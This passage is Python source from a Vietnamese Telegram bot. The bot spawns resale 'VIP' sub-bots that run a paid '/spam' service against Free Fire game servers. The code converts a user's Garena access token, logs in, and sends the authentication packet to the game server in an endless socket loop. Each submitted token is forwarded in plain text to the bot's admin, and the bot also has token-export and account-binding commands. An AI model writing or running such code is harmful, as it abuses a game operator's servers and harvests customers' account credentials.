    # Validate token format
    if ":" not in new_token or len(new_token) < 30:
        return await get_reply(update).reply_text(
            "```\n❌  Token không hợp lệ!\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    loading = await get_reply(update).reply_text(
        "```\n⏳  Đang tạo bot VIP mini...\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Tạo file bot mini
    bot_dir = os.path.dirname(os.path.abspath(__file__))
    bot_id = new_token.split(":")[0]
    mini_path = os.path.join(bot_dir, f"vip_bot_{bot_id}.py")

    mini_code = f'''# VIP Mini Bot - Auto generated
import httpx, logging, asyncio, urllib.parse, hashlib
import time, json, os, uuid, socket, threading, subprocess, sys
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode, ChatType
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import BadRequest
from ReQAPI import FreeFireAPI

BOT_TOKEN    = "{new_token}"
ADMIN_ID     = {ADMIN_ID}
BOT_NAME     = "VIP Service 💎"
VIP_CONTACT  = "{VIP_CONTACT}"
DB_FILE      = "vip_mini_{bot_id}.json"
TOKEN_LOG    = "vip_tokens_{bot_id}.txt"
SPAM_INTERVAL = 4
GARENA_HEADERS = {{"User-Agent": "GarenaMSDK/4.0.30 (iPhone9,1;ios - 15.8.6;vi-US;US)"}}

active_spams        = {{}}
user_active_session = {{}}
spam_logs           = {{}}

def load_db():
    if not os.path.exists(DB_FILE):
        data = {{"users": {{}}, "vip_keys": {{}}, "banned": []}}
        with open(DB_FILE, "w") as f: json.dump(data, f)
        return data
    with open(DB_FILE, "r") as f: return json.load(f)

def save_db(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

def check_vip(uid):
    vk = load_db()["vip_keys"].get(str(uid))
    if not vk: return False, "Chưa có VIP"
    if vk["expire"] == -1: return True, "Vĩnh viễn"
    left = vk["expire"] - time.time()
    if left <= 0: return False, "Hết hạn"
    return True, f"{{int(left//3600)}}h {{int((left%3600)//60)}}m"

def is_banned(uid): return str(uid) in load_db()["banned"]

async def convert_eat(token_input):
    if len(token_input) < 80 and "." in token_input: return token_input
    try:
        async with httpx.AsyncClient(timeout=10, follow_redirects=False) as c:
            r = await c.get(f"https://api-otrss.garena.com/support/callback/?access_token={{token_input}}")
            loc = r.headers.get("Location","")
            if loc:
                from urllib.parse import urlparse, parse_qs
                qs = parse_qs(urlparse(loc).query)
                acc = qs.get("access_token",[None])[0]
                if acc: return acc
    except: pass
    return token_input

def socket_spam_worker(session_id, server_ip, server_port, full_payload):
    if session_id not in spam_logs: spam_logs[session_id] = []
    count = 0
    def log(msg):
        ts = datetime.now().strftime("%H:%M:%S")
        spam_logs[session_id].append(f"[{{ts}}] {{msg}}")
        if len(spam_logs[session_id]) > 50: spam_logs[session_id].pop(0)
    log("🟢 Bắt đầu spam")
    while session_id in active_spams and active_spams[session_id]["running"]:
        if not check_vip(str(active_spams[session_id]["uid"]))[0]:
            active_spams[session_id]["running"] = False
            log("⛔ VIP hết hạn")
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5); s.connect((server_ip, server_port))
                s.sendall(full_payload); s.recv(1024)
            count += 1
            active_spams[session_id]["count"] = count
            log(f"✅ Gói #{{count}} OK")
            time.sleep(SPAM_INTERVAL)
        except Exception as e:
            log(f"❌ {{str(e)[:40]}}"); time.sleep(5)
    log("🔴 Đã dừng")

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != ChatType.PRIVATE: return
    uid = str(update.effective_user.id)
    if is_banned(uid): return
    db = load_db()
    if uid not in db["users"]:
        db["users"][uid] = {{"username": update.effective_user.username or ""}}
        save_db(db)
    has_vip, vip_left = check_vip(uid)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Hồ sơ", callback_data="profile"),
         InlineKeyboardButton("📋 Lệnh", callback_data="help")],
        [InlineKeyboardButton("💎 Liên hệ mua VIP", url=f"https://t.me/{{VIP_CONTACT.lstrip('@')}}")],
    ])
    await update.message.reply_text(
        f"```\n┌───⭓ {{BOT_NAME}}\n│  💎 VIP: {{'✅ ' + vip_left if has_vip else '❌ Chưa có'}}\n│  👑 Admin: {{VIP_CONTACT}}\n└──────────────────\n```",
        reply_markup=kb, parse_mode=ParseMode.MARKDOWN_V2
    )

async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if is_banned(uid): return
    has_vip, vip_left = check_vip(uid)
    if not has_vip:
        return await update.message.reply_text(
            f"```\n❌ Cần VIP!\n💰 Mua: {{VIP_CONTACT}}\n```", parse_mode=ParseMode.MARKDOWN_V2
        )
    if not ctx.args:
        return await update.message.reply_text("```\n⚠️ /spam <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token   = await convert_eat(ctx.args[0].strip())
    loading = await update.message.reply_text("```\n⏳ Đang đăng nhập...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        loop   = asyncio.get_event_loop()
        ff_api = FreeFireAPI()
        result = await loop.run_in_executor(None, lambda: ff_api.get(token, is_emulator=False))
        if not isinstance(result, dict):
            await loading.delete()
            return await update.message.reply_text("```\n❌ Token die!\n```", parse_mode=ParseMode.MARKDOWN_V2)
        sid         = str(uuid.uuid4())[:8]
        server_ip   = result["GameServerAddress"]["onlineip"]
        server_port = int(result["GameServerAddress"]["onlineport"])
        key_hex     = "".join(format(x,"02x") for x in result["key"])
        payload     = bytes(result["UserAuthPacket"]) + f"/log/{{key_hex}}/start".encode()
        active_spams[sid] = {{"running":True,"uid":uid,"nickname":result.get("UserNickName","?"),"count":0,"server_ip":server_ip,"server_port":server_port}}
        user_active_session[uid] = sid
        threading.Thread(target=socket_spam_worker, args=(sid,server_ip,server_port,payload), daemon=True).start()
        await loading.delete()
        await update.message.reply_text(
            f"```\n┌───⭓ 🚀 SPAM ĐANG CHẠY\n│ Nick: {{result.get('UserNickName')}}\n│ Session: {{sid}}\n│ VIP còn: {{vip_left}}\n└──────────────────\n```",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Dừng", callback_data="stop")]]),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        await ctx.bot.send_message(ADMIN_ID, f"```\n📡 SPAM VIP MINI\nUser: @{{update.effective_user.username}}\nNick: {{result.get('UserNickName')}}\nToken: {{token}}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    except Exception as e:
        try: await loading.delete()
        except: pass
        await update.message.reply_text(f"```\n❌ Lỗi: {{str(e)[:80]}}\n```", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_stopspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    sid = user_active_session.get(uid)
    if sid and sid in active_spams:
        active_spams[sid]["running"] = False
        del active_spams[sid]; user_active_session.pop(uid,None)
        await update.message.reply_text("```\n🛑 Đã dừng spam!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text("```\n⚠️ Không có phiên nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not active_spams:
        return await update.message.reply_text("```\n📭 Không có phiên nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    lines = "```\n┌───⭓ SPAM LOG\n│\n"
    for sid2, info2 in active_spams.items():
        lines += f"│ {{'🟢' if info2['running'] else '🔴'}} [{{sid2}}] {{info2['nickname']}} — {{info2['count']}} gói\n"
    lines += "└──────────────────\n```"
    await update.message.reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)

async def cb_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = str(q.from_user.id)
    if q.data == "stop":
        sid = user_active_session.get(uid)
        if sid and sid in active_spams:
            active_spams[sid]["running"] = False
            del active_spams[sid]; user_active_session.pop(uid,None)
            await q.message.reply_text("```\n🛑 Đã dừng!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    elif q.data == "profile":
        has_vip, vip_left = check_vip(uid)
        sid2 = user_active_session.get(uid)
        running = bool(sid2 and active_spams.get(sid2,{{}}).get("running"))
        await q.message.reply_text(
            f"```\n┌───⭓ HỒ SƠ\n│ ID: {{uid}}\n│ VIP: {{'✅ '+vip_left if has_vip else '❌'}}\n│ Spam: {{'🟢' if running else '🔴'}}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    elif q.data == "help":
        await q.message.reply_text(
            f"```\n┌───⭓ LỆNH\n│ /spam <token> — Spam log FF\n│ /stopspam     — Dừng spam\n│ /log          — Xem log (admin)\n│ 💰 Mua VIP: {{VIP_CONTACT}}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("spam",  cmd_spam))
    app.add_handler(CommandHandler("stopspam", cmd_stopspam))
    app.add_handler(CommandHandler("log",   cmd_log))
    app.add_handler(CallbackQueryHandler(cb_handler))
    print(f"✅ VIP Mini Bot {{BOT_TOKEN[:10]}}... đang chạy")
    app.run_polling(drop_pending_updates=True)
'''

    with open(mini_path, "w", encoding="utf-8") as f:
        f.write(mini_code)

    # Chạy bot mini trong process riêng
    proc = subprocess.Popen(
        [sys.executable, mini_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # Lưu PID vào DB để quản lý
    db = load_db()
    if "mini_bots" not in db:
        db["mini_bots"] = {}
    db["mini_bots"][bot_id] = {
        "token": new_token,
        "pid": proc.pid,
        "file": mini_path,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    save_db(db)

    await loading.delete()
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ BOT VIP MINI ĐÃ TẠO\n"
        f"│\n"
        f"│  🤖  Bot ID   :  {bot_id}\n"
        f"│  📌  PID      :  {proc.pid}\n"
        f"│  ✅  Đang chạy song song\n"
        f"│\n"
        f"│  Lệnh quản lý:\n"
        f"│  /stopbot {bot_id} — Dừng bot\n"
        f"│  /listbot         — DS bot mini\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_stopbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  /stopbot <bot_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    bid = ctx.args[0]
    db = load_db()
    bots = db.get("mini_bots", {})
    if bid not in bots:
        return await get_reply(update).reply_text("```\n❌  Không tìm thấy bot!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        import signal
        os.kill(bots[bid]["pid"], signal.SIGTERM)
    except Exception:
        pass
    del db["mini_bots"][bid]
    save_db(db)
    await get_reply(update).reply_text(f"```\n✅  Đã dừng bot {bid}\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_listbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    bots = db.get("mini_bots", {})
    if not bots:
        return await get_reply(update).reply_text("```\n📭  Chưa có bot mini nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    lines = "```\n┌───⭓ DANH SÁCH BOT MINI\n│\n"
    for bid, info in bots.items():
        # Kiểm tra process còn sống không
        try:
            os.kill(info["pid"], 0)
            status = "🟢 Đang chạy"
        except Exception:
            status = "🔴 Đã dừng"
        lines += f"│  {status}  ID: {bid}\n│  📅  {
            info['created']}\n├──────────────────\n"
    lines += "└──────────────────\n```"
    await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)


# ══════════════════════════════════════════════════════
#          ADMIN: KILL PROCESS, CLEAR MEM, QC
# ══════════════════════════════════════════════════════
@admin_only
async def cmd_killpy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Liệt kê và kill các process Python đang chạy"""
    import psutil
    procs = []
    current_pid = os.getpid()
    for p in psutil.process_iter(["pid", "name", "cmdline", "status"]):
        try:
            if "python" in p.info["name"].lower(
            ) and p.info["pid"] != current_pid:
                cmd = " ".join(p.info["cmdline"] or [])[:60]
                procs.append((p.info["pid"], cmd))
        except Exception:
            pass

    if not procs:
        return await get_reply(update).reply_text(
            "```\n📭  Không có process Python nào khác đang chạy!\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if ctx.args and ctx.args[0].isdigit():
        # Kill PID cụ thể
        pid = int(ctx.args[0])
        try:
            import signal
            os.kill(pid, signal.SIGTERM)
            await get_reply(update).reply_text(f"```\n✅  Đã kill PID {pid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:80]}\n```", parse_mode=ParseMode.MARKDOWN_V2)
        return

    lines = "```\n┌───⭓ PROCESS PYTHON ĐANG CHẠY\n│\n"
    for pid, cmd in procs:
        lines += f"│  PID {pid}: {cmd}\n"
    lines += "├──────────────────\n│  /killpy <pid> để kill\n└──────────────────\n```"
    await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_clearmem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Dọn RAM + cache Python"""
    import gc
    import psutil
    before = psutil.virtual_memory().used // 1024 // 1024
    gc.collect()
    # Xóa log spam cũ
    cleared_logs = 0
    for sid in list(spam_logs.keys()):
        if sid not in active_spams:
            del spam_logs[sid]
            cleared_logs += 1
    after = psutil.virtual_memory().used // 1024 // 1024
    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ DỌN BỘ NHỚ\n"
        f"│  💾  Trước  :  {before} MB\n"
        f"│  💾  Sau    :  {after} MB\n"
        f"│  🗑️  Giải phóng: {before - after} MB\n"
        f"│  📋  Log cũ xóa: {cleared_logs} phiên\n"
        f"└──────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )

# QC broadcast jobs: qc_jobs = {job_id: {interval, msg, job}}
qc_jobs = {}


@admin_only
async def cmd_qc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    /qc set <giây> <nội dung>  — Tạo QC tự động
    /qc list                    — Xem danh sách
    /qc stop <id>               — Dừng QC
    """
    if not ctx.args:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ QC TỰ ĐỘNG\n"
            "│  /qc set <giây> <nội dung>\n"
            "│  /qc list\n"
            "│  /qc stop <id>\n"
            "│  VD: /qc set 3600 Mua VIP giá rẻ!\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    sub = ctx.args[0].lower()

    if sub == "set":
        if len(ctx.args) < 3 or not ctx.args[1].isdigit():
            return await get_reply(update).reply_text("```\n⚠️  /qc set <giây> <nội dung>\n```", parse_mode=ParseMode.MARKDOWN_V2)
        interval = int(ctx.args[1])
        msg_text = " ".join(ctx.args[2:])
        qc_id = str(int(time.time()))[-6:]

        async def broadcast_qc(context):
            db2 = load_db()
            for u in list(db2["users"].keys()):
                try:
                    await context.bot.send_message(
                        int(u),
                        f"```\n┌───⭓ 📢 THÔNG BÁO\n│  {msg_text}\n└──────────────────\n```",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                    await asyncio.sleep(0.05)
                except Exception:
                    pass

        job = ctx.job_queue.run_repeating(
            broadcast_qc,
            interval=interval,
            first=interval,
            name=f"qc_{qc_id}")
        qc_jobs[qc_id] = {"interval": interval, "msg": msg_text, "job": job}
        await get_reply(update).reply_text(
            f"```\n✅  Đã tạo QC [{qc_id}]\n⏱️  Mỗi {interval}s\n📢  {msg_text}\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    elif sub == "list":
        if not qc_jobs:
            return await get_reply(update).reply_text("```\n📭  Không có QC nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
        lines = "```\n┌───⭓ DANH SÁCH QC\n│\n"
        for qid, info in qc_jobs.items():
            lines += f"│  [{qid}] mỗi {info['interval']}s\n│  📢 {info['msg'][:40]}\n├──────────────────\n"
        lines += "└──────────────────\n```"
        await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)

    elif sub == "stop":
        if len(ctx.args) < 2:
            return await get_reply(update).reply_text("```\n⚠️  /qc stop <id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
        qid = ctx.args[1]
        if qid in qc_jobs:
            try:
                qc_jobs[qid]["job"].schedule_removal()
            except BaseException:
                pass
            del qc_jobs[qid]
            await get_reply(update).reply_text(f"```\n✅  Đã dừng QC [{qid}]\n```", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await get_reply(update).reply_text(f"```\n❌  Không tìm thấy QC [{qid}]!\n```", parse_mode=ParseMode.MARKDOWN_V2)

# ══════════════════════════════════════════════════════
#               /nap  &  /cong
# ══════════════════════════════════════════════════════


async def cmd_nap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    user = update.effective_user
    if is_banned(uid):
        return
    if not is_bot_on():
        return await get_reply(update).reply_text("```\n🔴  Bot đang tắt!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    if not ctx.args or not ctx.args[0].isdigit():
        return await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓ NẠP TIỀN\n"
            f"│  Cú pháp: /nap <số tiền>\n"
            f"│  Ví dụ  : /nap 50000\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    amount = int(ctx.args[0])
    if amount < 10000:
        return await get_reply(update).reply_text("```\n⚠️  Số tiền tối thiểu là 10,000đ\n```", parse_mode=ParseMode.MARKDOWN_V2)

    noi_dung = f"MDS{uid}"
    expire = time.time() + 600  # 10 phút

    nap_text = (
        f"```\n"
        f"┌───⭓ THÔNG TIN NẠP TIỀN\n"
        f"│\n"
        f"│  🏦  Ngân hàng  :  {BANK_NAME}\n"
        f"│  💳  Số TK      :  {BANK_STK}\n"
        f"│  👤  Chủ TK     :  {BANK_OWNER}\n"
        f"│  💰  Số tiền    :  {amount:,}đ\n"
        f"│  📝  Nội dung   :  {noi_dung}\n"
        f"│\n"
        f"│  ⏳  Hết hạn sau 10 phút\n"
        f"│  📸  Gửi bill sau khi chuyển\n"
        f"│  👑  Admin duyệt: {VIP_CONTACT}\n"
        f"└──────────────────────────────\n"
        f"```"
    )
    msg = await update.message.reply_photo(
        photo="https://ibb.co/SXkctnxR",
        caption=nap_text,
        parse_mode=ParseMode.MARKDOWN_V2
    )

    pending_nap[uid] = {
        "amount": amount,
        "expire": expire,
        "msg_id": msg.message_id,
        "noi_dung": noi_dung,
        "username": user.username or user.first_name or "N/A"
    }

    # Báo admin
    try:
        await ctx.bot.send_message(
            ADMIN_ID,
            f"```\n"
            f"┌───⭓ YÊU CẦU NẠP MỚI\n"
            f"│\n"
            f"│  👤  User     :  {user.first_name} (@{user.username or 'N/A'})\n"
            f"│  🆔  ID       :  {uid}\n"
            f"│  💰  Số tiền  :  {amount:,}đ\n"
            f"│  📝  Nội dung :  {noi_dung}\n"
            f"│  ⏳  Hết hạn  :  10 phút\n"
            f"└──────────────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception:
        pass

    # Job tự hủy sau 10 phút
    async def auto_cancel(_ctx):
        if uid in pending_nap and pending_nap[uid]["expire"] <= time.time():
            del pending_nap[uid]
            try:
                await _ctx.bot.send_message(
                    int(uid),
                    f"```\n"
                    f"┌───⭓ HẾT HẠN NẠP TIỀN\n"
                    f"│  Lệnh nạp {amount:,}đ đã bị hủy\n"
                    f"│  vì quá 10 phút không chuyển.\n"
                    f"│  Dùng /nap để tạo lại.\n"
                    f"└──────────────────────\n"
                    f"```",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            except Exception:
                pass

    ctx.job_queue.run_once(auto_cancel, when=610)


@admin_only
async def cmd_cong(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Cú pháp: /cong <số tiền> <user_id> <nội dung>"""
    if len(ctx.args) < 3:
        return await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓ CỘNG TIỀN\n"
            f"│  Cú pháp: /cong <số tiền> <user_id> <nội dung>\n"
            f"│  Ví dụ  : /cong 50000 123456789 Nap VIP 30 ngay\n"
            f"└──────────────────────────────────────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    amount = ctx.args[0]
    user_id = ctx.args[1]
    content = " ".join(ctx.args[2:])

    # Lưu số dư vào DB
    db = load_db()
    if "balance" not in db:
        db["balance"] = {}
    cur_bal = db["balance"].get(user_id, 0)
    try:
        new_bal = cur_bal + int(amount)
    except ValueError:
        return await get_reply(update).reply_text("```\n❌  Số tiền không hợp lệ!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    db["balance"][user_id] = new_bal
    save_db(db)

    # Xóa pending nếu có
    if user_id in pending_nap:
        del pending_nap[user_id]

    # Thông báo cho user
    try:
        await ctx.bot.send_message(
            int(user_id),
            f"```\n"
            f"┌───⭓ CỘNG TIỀN THÀNH CÔNG\n"
            f"│\n"
            f"│  💰  Số tiền   :  +{int(amount):,}đ\n"
            f"│  💳  Số dư     :  {new_bal:,}đ\n"
            f"│  📝  Nội dung  :  {content}\n"
            f"│  👑  Từ Admin  :  {VIP_CONTACT}\n"
            f"└──────────────────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception:
        pass

    await get_reply(update).reply_text(
        f"```\n"
        f"┌───⭓ ĐÃ CỘNG TIỀN\n"
        f"│  User ID  :  {user_id}\n"
        f"│  Số tiền  :  +{int(amount):,}đ\n"
        f"│  Số dư mới:  {new_bal:,}đ\n"
        f"│  Nội dung :  {content}\n"
        f"└──────────────────────\n"
        f"```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


# ══════════════════════════════════════════════════════
#               GROUP FILTER
# ══════════════════════════════════════════════════════
async def group_filter(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    uid = str(update.effective_user.id)
    text = update.message.text.strip()

    # XỬ LÝ OTP CHO /addmail — ưu tiên xử lý trước
    if update.effective_chat.type == ChatType.PRIVATE:
        sess = user_active_session.get(uid)
        if isinstance(sess, dict) and sess.get(
                "action") == "verify_otp_addmail":
            loop = asyncio.get_event_loop()
            bot_tool = GarenaAutomator(sess["token"], sess["email"])
            res_v = await loop.run_in_executor(None, lambda: bot_tool.verify_otp(text))
            v_token = res_v.get("verifier_token")
            if v_token:
                await update.message.reply_text(
                    "```\n⏳  OTP đúng! Đang tiến hành liên kết...\n```",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
                res_final = await loop.run_in_executor(None, lambda: bot_tool.bind_account(v_token, sess["pass2"]))
                if res_final.get("result") == 0:
                    await update.message.reply_text(
                        "```\n┌───⭓ LIÊN KẾT EMAIL\n│  🎉  CHÚC MỪNG! Liên kết email thành công!\n└──────────────────\n```",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                else:
                    await update.message.reply_text(
                        f"```\n┌───⭓ LIÊN KẾT EMAIL\n│  ❌  Lỗi bước cuối: {str(res_final)[:80]}\n└──────────────────\n```",
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
            else:
                await update.message.reply_text(
                    "```\n┌───⭓ LIÊN KẾT EMAIL\n│  ❌  Mã OTP không đúng hoặc đã hết hạn.\n│  Thử lại bằng /addmail.\n└──────────────────\n```",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            del user_active_session[uid]
            return

    # Xử lý reply keyboard shortcuts trong private chat
    if update.effective_chat.type == ChatType.PRIVATE:
        uid_g = uid
        if text == "🏠 Menu":
            await send_main_menu(update.message, uid_g)
            return
        elif text == "👤 Hồ sơ":
            await cmd_profile(update, ctx)
            return
        elif text == "🎁 Key Free":
            await cmd_getkey(update, ctx)
            return
        elif text == "🛒 Mua VIP":
            await cmd_mua(update, ctx)
            return
        elif text == "🎉 Event":
            await cmd_event(update, ctx)
            return
        elif text == "🎁 Giftcode":
            await update.message.reply_text("```\n⚠️  Cú pháp: /giftcode <code>\n```", parse_mode=ParseMode.MARKDOWN_V2)
            return
        elif text == "📋 Lệnh":
            await cmd_help(update, ctx)
            return
        elif text == "💰 Nạp tiền":
            await update.message.reply_text("```\n⚠️  Cú pháp: /nap <số tiền>\n│  VD: /nap 50000\n```", parse_mode=ParseMode.MARKDOWN_V2)
            return
        # Xử lý game answer
        handled = await handle_game_answer(update, ctx)
        if handled:
            return

    # Xóa tin nhắn chứa token trong group
    if update.effective_chat.type != ChatType.PRIVATE:
        if "access_token" in text.lower() or len(text) > 60:
            try:
                await update.message.delete()
            except BaseException:
                pass

# ══════════════════════════════════════════════════════
#               KHỞI CHẠY
# ══════════════════════════════════════════════════════
if __name__ == "__main__":
    logging.basicConfig(
        format="%(asctime)s - %(levelname)s - %(message)s",
        level=logging.INFO)
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    jq = app.job_queue

    for cmd, fn in [
        ("start", cmd_start), ("help", cmd_help),
        ("profile", cmd_profile), ("getkey", cmd_getkey),
        ("activevip", cmd_activevip), ("spam", cmd_spam),
        ("stopspam", cmd_stopspam), ("checkmail", cmd_checkmail),
        ("checkmxh", cmd_checkmxh), ("admin", cmd_admin),
        ("createkey", cmd_createkey), ("ban", cmd_ban),
        ("unban", cmd_unban), ("broadcast", cmd_broadcast),
        ("listspam", cmd_listspam), ("stopall", cmd_stopall),
        ("listkey", cmd_listkey), ("listvip", cmd_listvip),
        ("setfreekey", cmd_setfreekey), ("cleanup", cmd_cleanup),
        ("nap", cmd_nap),
        ("cong", cmd_cong),
        ("mailinfo", cmd_mailinfo),
        ("sendotp", cmd_sendotp),
        ("verifyotp", cmd_verifyotp),
        ("unbind", cmd_unbind),
        ("unbindotp", cmd_unbindotp),
        ("cancelreq", cmd_cancelreq),
        ("vipstats", cmd_vipstats),
        ("delvip", cmd_delvip),
        ("exportvip", cmd_exportvip),
        ("info", cmd_info),
        ("dxuat", cmd_dxuat),
       #("addmail", cmd_addmail),
        ("setspam", cmd_setspam),
        ("checkupdate", cmd_checkupdate),
        ("exporttoken", cmd_exporttoken),
        ("sysinfo", cmd_sysinfo),
        ("mua", cmd_mua),
        ("setshop", cmd_setshop),
        ("delshop", cmd_delshop),
        ("event", cmd_event),
        ("joinevent", cmd_joinevent),
        ("createevent", cmd_createevent),
        ("endevent", cmd_endevent),
        ("listevents", cmd_listevents),
        ("eventsubs", cmd_eventsubs),
        ("giftcode", cmd_giftcode),
        ("creategift", cmd_creategift),
        ("listgift", cmd_listgift),
        ("delgift", cmd_delgift),
        ("setfeature", cmd_setfeature),
        ("log", cmd_log),
        ("add", cmd_add),
        ("stopbot", cmd_stopbot),
        ("listbot", cmd_listbot),
        ("killpy", cmd_killpy),
        ("clearmem", cmd_clearmem),
        ("qc", cmd_qc),
    ]:
        app.add_handler(CommandHandler(cmd, fn))

    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.ALL, group_filter))
    app.add_handler(
        MessageHandler(
            filters.PHOTO & filters.ChatType.PRIVATE,
            handle_event_photo))

    jq.run_repeating(check_vip_expired_job, interval=3600, first=10)

    print("✅  Bot đang chạy...")
    app.run_polling(drop_pending_updates=True)
